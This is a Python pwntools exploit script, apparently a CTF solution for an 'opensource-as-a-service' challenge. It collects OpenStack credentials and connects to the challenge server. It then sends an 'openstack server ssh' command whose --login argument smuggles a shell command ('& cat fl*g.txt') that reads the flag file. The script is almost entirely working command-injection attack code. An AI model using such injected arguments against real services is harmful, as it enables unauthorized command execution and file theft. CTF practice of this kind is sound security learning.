#!/usr/bin/env python3
from pwn import *
import os

# Alternatively you could setup a fake openstack server locally,
# but I'm lazy and I had a real openstack token when writing the exploit ^^'
os_region_name = os.getenv("OS_REGION_NAME")
if not os_region_name:
    os_region_name = input("OpenStack region name?")
os_tenant_name = os.getenv("OS_TENANT_NAME")
if not os_tenant_name:
    os_tenant_name = input("OpenStack tenant name?")
os_tenant_id = os.getenv("OS_TENANT_ID")
if not os_tenant_id:
    os_tenant_id = input("OpenStack tenant id?")
os_auth_url = os.getenv("OS_AUTH_URL")
if not os_auth_url:
    os_auth_url = input("OpenStack auth url?")
os_username = os.getenv("OS_USERNAME")
if not os_username:
    os_username = input("OpenStack username?")
os_password = os.getenv("OS_PASSWORD")
if not os_password:
    os_password = input("OpenStack password?")

list_servers = "openstack " \
      "--os-region-name={} " \
      "--os-tenant-name={} " \
      "--os-tenant-id={} " \
      "--os-auth-url={} " \
      "--os-username={} " \
      "--os-password={} " \
      "server list"
ssh_server = "openstack " \
      "--os-region-name={} " \
      "--os-tenant-name={} " \
      "--os-tenant-id={} " \
      "--os-auth-url={} " \
      "--os-username={} " \
      "--os-password={} " \
      "server ssh --login 'tes & cat fl*g.txt;echo # ' " \
      "--address-type 'Ext-Net' " \
      "--port 22 " \
      "{}"
list_servers = list_servers.format(os_region_name, os_tenant_name, os_tenant_id, os_auth_url, os_username, os_password)

conn = remote("opensource-as-a-service.ctf.insecurity-insa.fr", 12345)
# conn = remote("localhost", 12345)


def menu(conn):
    for _ in range(12):
        conn.readline()


menu(conn)
conn.sendline(list_servers)
step = 0
os_server_id = None
while step != 3:
    line = conn.readline()
    if b"+----------------" in line:
        step += 1
    if not os_server_id and b"Ext-Net=" in line:
        os_server_id = line.split(b" ")[1].decode()

ssh_server = ssh_server.format(os_region_name, os_tenant_name, os_tenant_id, os_auth_url, os_username, os_password, os_server_id)
conn.sendline(ssh_server)
conn.readline()
flag = conn.readline().strip()
if b"INSA{" not in flag:
    exit(1)

print(flag)
conn.close()
